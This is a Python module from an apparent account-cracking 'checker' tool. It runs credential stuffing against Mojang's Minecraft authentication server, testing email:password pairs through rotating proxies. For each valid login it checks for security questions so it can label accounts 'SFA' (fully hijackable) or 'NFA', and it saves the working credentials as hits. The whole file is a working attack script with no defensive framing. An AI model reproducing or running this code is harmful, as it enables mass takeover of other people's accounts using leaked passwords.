from __main__ import checker
from modules.functions import set_proxy,log,save
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        try:
            body = {'agent': {'name': 'Minecraft','version': 1},'username': email,'password': password,'clientToken': "fff"}
            header_1 = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
            header_2 = {'Pragma': 'no-cache', "Authorization": f""}
            r = post(url="https://authserver.mojang.com/authenticate",headers=header_1,json=body,timeout=checker.timeout,proxies=set_proxy(proxy))
            if 'Invalid credentials' in r.text:
                retries += 1
            elif "[]" in r.text:
                if not checker.cui:
                    log("custom",email+":"+password,"Minecraft")
                save("Minecraft","custom",checker.time,email+":"+password+" | Demo")
                checker.custom += 1
                checker.cpm += 1
                return
            elif "accessToken" in r.text:
                accessToken = r.json()["accessToken"]
                header_2["Authorization"] = f"Bearer {accessToken}"
                z = get("https://api.mojang.com/user/security/challenges", headers=header_2,proxies=set_proxy(proxy),timeout=checker.timeout).text
                if z == '[]':
                    if not checker.cui:
                        log("good",email+":"+password,"Minecraft")
                    save("Minecraft","good",checker.time,email+":"+password+" | SFA")
                    checker.good += 1
                    checker.cpm += 1
                    return
                else:
                    if not checker.cui:
                        log("good",email+":"+password,"Minecraft")
                    save("Minecraft","good",checker.time,email+":"+password+" | NFA")
                    checker.good += 1
                    checker.cpm += 1
                    return
            else:
                raise
        except:
            checker.errors += 1
    checker.bad += 1 
    checker.cpm += 1
    return